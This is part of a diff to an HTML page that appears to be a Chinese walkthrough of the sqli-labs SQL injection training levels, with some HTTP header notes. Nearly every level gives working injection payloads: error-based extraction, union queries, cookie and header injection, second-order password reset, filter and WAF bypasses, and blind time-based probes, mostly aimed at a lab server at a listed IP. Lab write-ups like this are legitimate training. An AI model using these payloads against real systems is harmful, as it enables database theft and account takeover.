+<p>输入admin，admin测试后发现会查询IP和user agent，所以通过burp抓包后修改这两个地方的参数，加入sql查询语句<br />
 'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1</p>
 <h4 id="less-19">less-19：</h4>
-<p>测试后发现返回的是referer
-构造查询语句
+<p>测试后发现返回的是referer<br />
+构造查询语句<br />
 'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and '1'='1</p>
 <h4 id="less-20">less-20：</h4>
-<p>测试后发现在cookie处可以注入，还是用burp抓包后更改为sql注入语句
-这里是通过cookie来获取uname的，所以改成下面这样
+<p>测试后发现在cookie处可以注入，还是用burp抓包后更改为sql注入语句<br />
+这里是通过cookie来获取uname的，所以改成下面这样<br />
 uname=admin1'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</p>
 <h4 id="less-21">less-21：</h4>
 <p>这里对cookie进行了base64处理，所以只要把要注入的SQL语句转换成base64就行</p>
@@ -9158,8 +9158,8 @@ uname=admin1'and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</p>
 <p>5、 Authorization：当客户端接收到来自 WEB 服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给 WEB 服务器。</p>
 <p>6、 Cache-Control：请求：no-cache（不要缓存的实体，要求现在从 WEB 服务器去取）</p>
 <p>7、 Connection：请求：close（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。keepalive（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。</p>
-<p>响应：close（连接已经关闭）。
-keepalive（连接保持着，在等待本次连接的后续请求）。
+<p>响应：close（连接已经关闭）。<br />
+keepalive（连接保持着，在等待本次连接的后续请求）。<br />
 Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300</p>
 <p>8、 Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip</p>
 <p>9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。</p>
@@ -9186,70 +9186,70 @@ Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB �
 <p>30、 Vary: WEB 服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源 WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding</p>
 <p>31、补充： X-Forwarded-For，用来伪造请求的IIP地址</p>
 <h4 id="less-23">less-23</h4>
-<p>对#跟--做了过滤，
-$reg = "/#/";
-$reg1 = "/--/";
-$replace = "";
-$id = preg_replace($reg, $replace, $id);
+<p>对#跟--做了过滤，<br />
+$reg = "/#/";<br />
+$reg1 = "/--/";<br />
+$replace = "";<br />
+$id = preg_replace($reg, $replace, $id);<br />
 $id = preg_replace($reg1, $replace, $id);</p>
-<p>需要用单引号去闭合后面的：
-<a href="http://43.247.91.228:84/Less-23/?id=-1">http://43.247.91.228:84/Less-23/?id=-1</a>' union select 1,2,'3
+<p>需要用单引号去闭合后面的：<br />
+<a href="http://43.247.91.228:84/Less-23/?id=-1">http://43.247.91.228:84/Less-23/?id=-1</a>' union select 1,2,'3<br />
 可以发现2，3回显</p>
 <p>http://43.247.91.228:84/Less-23/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),'3</p>
 <h4 id="less-24">less-24</h4>
 <p>二次注入，先注册一个admin'#的用户名，然后当修改密码的时候会执行一下查询语句</p>
-<p>update user set password='修改的密码' where username='admin'#'
+<p>update user set password='修改的密码' where username='admin'#'<br />
 这样就成功修改了 admin 的密码了</p>
 <h4 id="less-25">less-25</h4>
 <p>过滤掉了or 和 and 测试的时候用 || 就可以，注入的时候 information 要改成 infoorrmation，来补上 or</p>
 <p>http://43.247.91.228:84/Less-25/?id=-1' union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'),3--+</p>
 <h4 id="less-25a">less-25a</h4>
-<p>不闭合的情况下执行25关的就可以
+<p>不闭合的情况下执行25关的就可以<br />
 http://43.247.91.228:84/Less-25a/?id=-1 union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'),3--+</p>
 <h4 id="less-26">less-26</h4>
-<p>注释被过滤掉，可以使用单引号闭合，?id=-1' or '1'='1
+<p>注释被过滤掉，可以使用单引号闭合，?id=-1' or '1'='1<br />
 同时 or 也被注释掉了，需要双写绕过 infoormation</p>
-<p>空格过滤了，用下面这些替换
-%09    TAB 键（水平）
-%0a    新建一行
-%0b    TAB 键（垂直）
-%0c    新的一页
-%0d    return 功能
+<p>空格过滤了，用下面这些替换<br />
+%09    TAB 键（水平）<br />
+%0a    新建一行<br />
+%0b    TAB 键（垂直）<br />
+%0c    新的一页<br />
+%0d    return 功能<br />
 %a0    空格</p>
 <p>http://43.247.91.228:84/Less-26/?id=-1' union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema='security'),'3</p>
 <h4 id="less-26a">less-26a</h4>
-<p>改成了用 ('') 来闭合
+<p>改成了用 ('') 来闭合<br />
 http://43.247.91.228:84/Less-26a/?id=100')union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema='security'),3||('1</p>
 <h4 id="less-27">less-27</h4>
-<p>过滤 select 和 union 但是大小写绕过
+<p>过滤 select 和 union 但是大小写绕过<br />
 http://43.247.91.228:84/Less-27/?id=100'%a0uNion%a0seleCt%a01,2,3||'1</p>
-<p>注出表名
+<p>注出表名<br />
 http://43.247.91.228:84/Less-27/?id=100'%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='security'),3||'1</p>
 <h4 id="less-27a">less-27a</h4>
-<p>这关闭合用的是 "
+<p>这关闭合用的是 "<br />
 http://43.247.91.228:84/Less-27a/?id=100"%a0uNion%a0seleCt%a01,(sElect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='security'),3||"1</p>
 <h4 id="less-28">less-28</h4>
-<p>闭合用的是 ') 但是竟然没有过滤 select 和 union !?
+<p>闭合用的是 ') 但是竟然没有过滤 select 和 union !?<br />
 http://43.247.91.228:84/Less-28/?id=10000')union%a0select%a0(1),(2),(3)||('1</p>
 <p>http://43.247.91.228:84/Less-28/?id=10000')union%a0select%a0(1),(select%a0group_concat(table_name)from%a0information_schema.tables%a0where%a0table_schema='security'),(3)||('1</p>
 <h4 id="less-28a">less-28a</h4>
 <p>跟之前的28一样啊！？</p>
 <h4 id="less-29-31">less-29-31</h4>
-<p>29 主要是用了两个服务器，第一个充当waf
+<p>29 主要是用了两个服务器，第一个充当waf<br />
 第一个服务器时tomcat第二个是apache，tomcat解析参数时从前面解析，apache解析参数时从后面解析，所以可以传递两个参数 ?id=1&amp;id=2 他会解析第二个</p>
-<p>http://43.247.91.228:84/Less-29/?id=1&amp;id=1000' union select 1,2,3--+
+<p>http://43.247.91.228:84/Less-29/?id=1&amp;id=1000' union select 1,2,3--+<br />
 http://43.247.91.228:84/Less-29/?id=1&amp;id=1000' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</p>
-<p>30 只是用 " 来限定
+<p>30 只是用 " 来限定<br />
 31 用 ")</p>
 <h4 id="less-32">less-32</h4>
-<p>宽字节注入，，只需要在 ' 前面加上个 %aa 让转义字符失效就可以了
+<p>宽字节注入，，只需要在 ' 前面加上个 %aa 让转义字符失效就可以了<br />
 http://43.247.91.228:84/Less-32/?id=-1%aa'union select 1,2,3--+</p>
 <h4 id="less-33">less-33</h4>
 <p>http://43.247.91.228:84/Less-33/?id=-1%aa'union select 1,2,3--+</p>
 <h4 id="less-34">less-34</h4>
-<p>post 方式，没法 urlencode，所以使用：
-�'or 1=1#
-�'union select 1,2#
+<p>post 方式，没法 urlencode，所以使用：<br />
+�'or 1=1#<br />
+�'union select 1,2#<br />
 �'union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479#</p>
 <h4 id="less-35">less-35</h4>
 <p>http://43.247.91.228:84/Less-35/?id=-1 or 1=1--+</p>
@@ -9269,52 +9269,52 @@ http://43.247.91.228:84/Less-32/?id=-1%aa'union select 1,2,3--+</p>
 <h4 id="less-41-45">less-41-45</h4>
 <p>知识换成了post方式，在password处没有过滤，使用上面的攻击就可以</p>
 <h2 id="order-by">ORDER BY 注入</h2>
-<p>order by 不能使用 union select，先来了解一下 order by 的一些参数
-asc 升序，desc 降序，如果在后面分别试这两个，排序结果不一样那么就说明可能存在注入
+<p>order by 不能使用 union select，先来了解一下 order by 的一些参数<br />
+asc 升序，desc 降序，如果在后面分别试这两个，排序结果不一样那么就说明可能存在注入<br />
 由于 order by 后面只能接 (字段名，位置，表达式) 等信息，如果并不能向原来一样使用联合查询。这里面直接使用 sort=(select ...) 的方式来实现报错注入</p>
 <h3 id="order-by_1">order by 报错注入</h3>
-<p>这是在 mysql 下测试的报错语句，可以用到
-select * from users order by id and(updatexml(1,concat(0x7e,(select database())),0));
+<p>这是在 mysql 下测试的报错语句，可以用到<br />
+select * from users order by id and(updatexml(1,concat(0x7e,(select database())),0));<br />
 ERROR 1105 (HY000): XPATH syntax error: '~security'        //获取当前数据库</p>
-<p>select * from users order by id and(updatexml(1,concat(0x7e,(select version())),0));         
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select version())),0));         <br />
 ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'      //获取数据库版本</p>
-<p>select * from users order by id and(updatexml(1,concat(0x7e,(select user())),0));        
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select user())),0));        <br />
 ERROR 1105 (HY000): XPATH syntax error: '~root@localhost'     //获取用户</p>
-<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@datadir)),0));
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@datadir)),0));<br />
 ERROR 1105 (HY000): XPATH syntax error: '~E:\soft\phpmystudy\MySQL\data\'        //获取数据库路径</p>
-<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@version_compile_os)),0));
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@version_compile_os)),0));<br />
 ERROR 1105 (HY000): XPATH syntax error: '~Win32'      //获取操作系统</p>
-<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@basedir)),0));
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select @@basedir)),0));<br />
 ERROR 1105 (HY000): XPATH syntax error: '~E:/soft/phpmystudy/MySQL/'       //mysql安装路径</p>
-<p>select * from users order by id and(updatexml(1,concat(0x7e,(select session_user())),0));
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select session_user())),0));<br />
 ERROR 1105 (HY000): XPATH syntax error: '~root@localhost'      //获取连接数据库的用户名</p>
-<p>select * from users order by id and(updatexml(1,concat(0x7e,(select current_user())),0));
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select current_user())),0));<br />
 ERROR 1105 (HY000): XPATH syntax error: '~root@localhost'      //获取当前用户名</p>
-<p>select * from users order by id and(updatexml(1,concat(0x7e,(select system_user())),0));
+<p>select * from users order by id and(updatexml(1,concat(0x7e,(select system_user())),0));<br />
 ERROR 1105 (HY000): XPATH syntax error: '~root@localhost'        //获取系统用户名</p>
-<p>通过报错注入例如：
-http://43.247.91.228:84/Less-46/?sort=(updatexml(1,concat(0x7e,(select @@version),0x7e),1))
-http://43.247.91.228:84/Less-46/?sort=(extractvalue(1,concat(0x7e,(select @@version),0x7e)))
+<p>通过报错注入例如：<br />
+http://43.247.91.228:84/Less-46/?sort=(updatexml(1,concat(0x7e,(select @@version),0x7e),1))<br />
+http://43.247.91.228:84/Less-46/?sort=(extractvalue(1,concat(0x7e,(select @@version),0x7e)))<br />
 http://43.247.91.228:84/Less-46/?sort=(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1))</p>
 <h3 id="order-by_2">order by 盲注</h3>
 <h3 id="_6"></h3>
-<p>select * from users order by id ^(select(select version()) regexp '^5');  不正常排序
+<p>select * from users order by id ^(select(select version()) regexp '^5');  不正常排序<br />
 select * from users order by id ^(select(select version()) regexp '^aaaa');  正常排序</p>
 <p>因为异或 0 的时候相当于啥都不做，，所以只要是显示乱序就表示这个猜对了</p>
 <h4 id="less-46">less-46</h4>
-<p>http://43.247.91.228:84/Less-46/?sort=(extractvalue(1,concat(0x7e,(select @@version),0x7e)))
+<p>http://43.247.91.228:84/Less-46/?sort=(extractvalue(1,concat(0x7e,(select @@version),0x7e)))<br />
 http://43.247.91.228:84/Less-46/?sort=(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e)))</p>
 <h4 id="less-47">less-47</h4>
-<p>前面改成了 ' $id '，只需要闭合单引号就可以了
-http://43.247.91.228:84/Less-47/?sort=1' and 1=(extractvalue(1,concat(0x7e,(select @@version),0x7e)))--+
+<p>前面改成了 ' $id '，只需要闭合单引号就可以了<br />
+http://43.247.91.228:84/Less-47/?sort=1' and 1=(extractvalue(1,concat(0x7e,(select @@version),0x7e)))--+<br />
 http://43.247.91.228:84/Less-47/?sort=1' and 1=(extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e)))--+</p>
 <h4 id="less-48">less-48</h4>
-<p>不返回错误信息，盲注！
-根据上面的，慢慢试吧！？
+<p>不返回错误信息，盲注！<br />
+根据上面的，慢慢试吧！？<br />
 http://43.247.91.228:84/Less-48/?sort=id ^(select(select version()) regexp '^5')</p>
 <h4 id="less-49">less-49</h4>
-<p>又用了单引号闭合，还需要绕过单引号
-这里可以通过基于时间的盲注来实现（上面哪种方法还没试出来怎么绕过那个单引号）
+<p>又用了单引号闭合，还需要绕过单引号<br />
+这里可以通过基于时间的盲注来实现（上面哪种方法还没试出来怎么绕过那个单引号）<br />
 http://43.247.91.228:84/Less-49/?sort=1' and if(ascii(substr(database(),1,1))=112,1,sleep(0.2))%23</p>
 <h4 id="less-50">less-50</h4>
 <p>题目说的是堆叠注入，但是报错注入也是可以的</p>
@@ -9323,7 +9323,7 @@ http://43.247.91.228:84/Less-49/?sort=1' and if(ascii(substr(database(),1,1))=11
 <h4 id="less-52">less-52</h4>
 <p>http://43.247.91.228:84/Less-52/?sort=id ^(select(select version()) regexp '^5.5.4')</p>
 <h4 id="less-53">less-53</h4>
-<p>基于时间的盲注
+<p>基于时间的盲注<br />
 http://43.247.91.228:84/Less-49/?sort=1' and if(ascii(substr(database(),1,1))=112,1,sleep(0.2))%23</p>
 <h4 id="less-54-57">less-54-57</h4>
 <p>很简单的注入，限制了次数，不过只要试出来是怎么界定的就可以了</p>
